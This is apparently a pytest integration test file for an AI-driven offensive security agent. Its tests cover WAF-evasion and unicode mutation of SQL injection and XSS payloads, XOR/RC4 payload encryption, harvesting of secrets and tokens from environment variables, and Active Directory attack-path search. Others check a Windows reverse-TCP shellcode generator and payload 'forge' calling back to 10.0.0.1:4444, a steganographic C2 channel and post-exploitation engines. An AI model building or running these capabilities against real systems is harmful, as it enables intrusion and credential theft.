#!/usr/bin/env python3
"""Integration tests verifying cross-module interactions."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def test_core_imports_and_singleton() -> None:
    """State singleton guarantees single instance per target."""
    from core.agent.state import AgentState

    s1 = AgentState("test_singleton")
    s2 = AgentState("test_singleton_other")
    assert s1 is s2, "AgentState singleton broken"


def test_ast_security_blocks_eval() -> None:
    """AST checker must flag eval() as dangerous."""
    from core.intelligence.coder import ASTSecurityChecker

    checker = ASTSecurityChecker()
    violations = checker.check('eval("test")')
    assert len(violations) > 0
    assert any("eval" in str(v).lower() for v in violations)


def test_llm_cache_roundtrip() -> None:
    """LLM cache stores and retrieves exact responses."""
    from llm.openrouter_client import LLMCache

    cache = LLMCache()
    cache.set("prompt_x", "system_y", "model_z", "cached_response")
    assert cache.get("prompt_x", "system_y", "model_z") == "cached_response"
    assert cache.get("prompt_x", "system_y", "wrong_model") is None


def test_payload_precondition_enforcement() -> None:
    """Payload generation must be BLOCKED without foothold."""
    from modules.payload import check_payload_preconditions

    try:
        from core.agent.state import reset_state
        state = reset_state("precondition_test")
        can_exec, reason = check_payload_preconditions(state)
        assert not can_exec, "Payload should be forbidden without foothold"
        assert "FORBIDDEN" in reason or "foothold" in reason.lower()
    except ImportError:
        pass  # State module optional


def test_waf_evasion_actually_mutates() -> None:
    """WAF evasion must produce different output than input."""
    from modules.waf_evasion import WAFEvasion

    waf = WAFEvasion()
    original_sql = "UNION SELECT password FROM users"
    obfuscated = waf.obfuscate_sql(original_sql)
    assert obfuscated != original_sql, "SQL obfuscation produced identical output"

    original_xss = "<script>alert(1)</script>"
    obfuscated_xss = waf.obfuscate_xss(original_xss)
    assert obfuscated_xss != original_xss, "XSS obfuscation produced identical output"


def test_exploit_mutation_produces_unicode() -> None:
    """AI evasion should produce unicode-mutated XSS variants."""
    from modules.exploit import AIEvasion

    payload = "<script>alert(1)</script>"
    mutations = AIEvasion.mutate_payload(payload, strategy="semantic")
    assert len(mutations) > 0
    # At least one mutation should contain fullwidth characters
    assert any(ord(c) > 127 for m in mutations for c in m), \
        "No unicode mutations produced"


def test_weapon_foundry_encryption_roundtrip() -> None:
    """Verify XOR and RC4 encryption/decryption produce original data."""
    from modules.weapon_foundry import EncryptionEngine

    engine = EncryptionEngine()
    plaintext = b"sensitive_payload_data_here"
    key = engine.generate_key(16)

    # XOR roundtrip
    encrypted = engine.xor_encrypt(plaintext, key)
    assert encrypted != plaintext
    decrypted = engine.xor_decrypt(encrypted, key)
    assert decrypted == plaintext

    # RC4 roundtrip
    rc4_enc = engine.rc4_crypt(plaintext, key)
    assert rc4_enc != plaintext
    rc4_dec = engine.rc4_crypt(rc4_enc, key)
    assert rc4_dec == plaintext


def test_credential_harvester_finds_env_vars() -> None:
    """Credential harvester should detect password-like env vars."""
    from modules.hive_mind import CredentialHarvester

    os.environ["TEST_DRAKBEN_SECRET"] = "s3cret_value"
    try:
        harvester = CredentialHarvester()
        creds = harvester.harvest_environment()
        found = any("TEST_DRAKBEN_SECRET" in c.username for c in creds)
        assert found, "Harvester missed TEST_DRAKBEN_SECRET env var"
    finally:
        del os.environ["TEST_DRAKBEN_SECRET"]


def test_attack_path_bfs_finds_multihop() -> None:
    """BFS attack path should find multi-hop routes."""
    from modules.hive_mind import (
        ADAnalyzer,
        Credential,
        CredentialType,
        NetworkHost,
    )

    hosts = {
        "attacker": NetworkHost(ip="10.0.0.1", ports=[22]),
        "pivot": NetworkHost(ip="10.0.0.2", ports=[22, 445]),
        "target": NetworkHost(ip="10.0.0.3", ports=[445, 3389]),
    }
    creds = [Credential(
        username="admin", domain="CORP",
        credential_type=CredentialType.PASSWORD,
        value="pass", source="env", admin_level=True,
    )]

    analyzer = ADAnalyzer()
    path = analyzer.calculate_attack_path("attacker", "target", creds, hosts)

    assert path is not None, "BFS should find a path through pivot"
    assert len(path.hops) >= 1, "Path should have at least one hop"
    assert path.target == "target"
    assert path.probability > 0


def test_tool_registry_executes_python_tools() -> None:
    """Tool registry should have functional Python tool wrappers."""
    from core.tools.tool_registry import ToolRegistry, ToolType

    registry = ToolRegistry()
    python_tools = registry.list_by_type(ToolType.PYTHON)
    assert len(python_tools) >= 5, f"Expected 5+ Python tools, got {len(python_tools)}"

    # Verify tools have actual functions attached
    for tool in python_tools:
        assert tool.python_func is not None, f"Tool {tool.name} has no python_func"


def test_recon_domain_extraction() -> None:
    """Recon module extracts domains correctly."""
    from modules.recon import extract_domain

    assert extract_domain("https://example.com/path") == "example.com"
    assert extract_domain("http://sub.domain.org:8080") == "sub.domain.org"


def test_recon_tech_detection() -> None:
    """Technology detection finds known frameworks in HTML/headers."""
    from modules.recon import detect_technologies

    techs = detect_technologies(
        "<script src='jquery.js'></script>",
        {"Server": "nginx", "X-Powered-By": "Express"},
    )
    assert len(techs) > 0
    tech_names = [t.lower() if isinstance(t, str) else str(t).lower() for t in techs]
    assert any("jquery" in t or "nginx" in t for t in tech_names)


def test_shellcode_generator_patches_ip_port() -> None:
    """ShellcodeGenerator should produce real shellcode (not NOP+INT3 stub)."""
    from modules.weapon_foundry import ShellcodeGenerator

    sc = ShellcodeGenerator.get_windows_x64_reverse_tcp("192.168.1.50", 4444)
    assert len(sc) > 100, f"Expected real shellcode, got {len(sc)} bytes"
    assert sc != b"\x90" * 16 + b"\xcc", "Still returning NOP stub"
    # Port 4444 = 0x115C, in big-endian = bytes 0x11, 0x5C
    assert b"\x11\x5c" in sc, "Port not patched into shellcode"
    # IP 192.168.1.50 → 0xC0, 0xA8, 0x01, 0x32
    assert bytes([192, 168, 1, 50]) in sc, "IP not patched into shellcode"


def test_shellcode_generator_rejects_invalid() -> None:
    """Invalid IP/port should return empty bytes, not crash."""
    from modules.weapon_foundry import ShellcodeGenerator

    assert ShellcodeGenerator.get_windows_x64_reverse_tcp("not.an.ip", 80) == b""
    assert ShellcodeGenerator.get_windows_x64_reverse_tcp("1.2.3.4", 0) == b""
    assert ShellcodeGenerator.get_windows_x64_reverse_tcp("1.2.3.4", 99999) == b""


def test_weapon_foundry_raw_and_c_formats() -> None:
    """RAW and C payload formats should produce non-empty output."""
    from modules.weapon_foundry import (
        EncryptionMethod,
        PayloadFormat,
        ShellType,
        WeaponFoundry,
    )

    foundry = WeaponFoundry()

    raw = foundry.forge(
        shell_type=ShellType.REVERSE_TCP, lhost="10.0.0.1", lport=4444,
        encryption=EncryptionMethod.NONE, format=PayloadFormat.RAW,
    )
    assert len(raw.payload) > 0, "RAW format should produce payload bytes"

    c_payload = foundry.forge(
        shell_type=ShellType.REVERSE_TCP, lhost="10.0.0.1", lport=4444,
        encryption=EncryptionMethod.NONE, format=PayloadFormat.C,
    )
    payload_text = c_payload.payload.decode("utf-8", errors="replace")
    assert "VirtualAlloc" in payload_text, "C format should contain VirtualAlloc"
    assert "0x" in payload_text, "C format should contain hex bytes"


def test_credential_harvester_classifies_token_and_cert() -> None:
    """Environment vars with TOKEN/CERT keywords should get proper types."""
    import os

    from modules.hive_mind import CredentialHarvester, CredentialType

    os.environ["DRAKBEN_TEST_API_TOKEN"] = "tok-1234"
    os.environ["DRAKBEN_TEST_TLS_CERTIFICATE"] = "/etc/tls/cert.pem"
    try:
        h = CredentialHarvester()
        creds = h.harvest_environment()
        types = {c.credential_type for c in creds if "DRAKBEN_TEST" in c.username}
        assert CredentialType.TOKEN in types, "TOKEN env-var should be classified as TOKEN"
        assert CredentialType.CERTIFICATE in types, "CERT env-var should be classified as CERTIFICATE"
    finally:
        del os.environ["DRAKBEN_TEST_API_TOKEN"]
        del os.environ["DRAKBEN_TEST_TLS_CERTIFICATE"]


def test_c2_stego_protocol_initialises() -> None:
    """C2Channel with STEGO protocol should initialise stego_transport."""
    from modules.c2_framework import C2Channel, C2Config, C2Protocol

    config = C2Config(protocol=C2Protocol.STEGO)
    channel = C2Channel(config)
    assert channel.stego_transport is not None, "STEGO should create stego_transport"


def test_tool_registry_weapon_forge_returns_real_payload() -> None:
    """_run_weapon_forge should return actual payload data, not 'status: ready'."""
    from core.tools.tool_registry import ToolRegistry

    r = ToolRegistry()
    result = r._run_weapon_forge("192.168.1.100", lhost="10.0.0.1", lport="4444")
    assert "status" not in result, "Should return real payload info, not placeholder"
    assert result.get("size_bytes", 0) > 0, "Payload should have non-zero size"
    assert "shell_type" in result


def test_tool_registry_post_exploit_uses_real_class() -> None:
    """_run_post_exploit should use PostExploitEngine (not non-existent PostExploit)."""
    from core.tools.tool_registry import ToolRegistry

    result = ToolRegistry()._run_post_exploit("192.168.1.100")
    assert result.get("engine") == "PostExploitEngine"
    assert "linux_actions" in result
    assert "windows_actions" in result


if __name__ == "__main__":
    import pytest
    sys.exit(pytest.main([__file__, "-v"]))
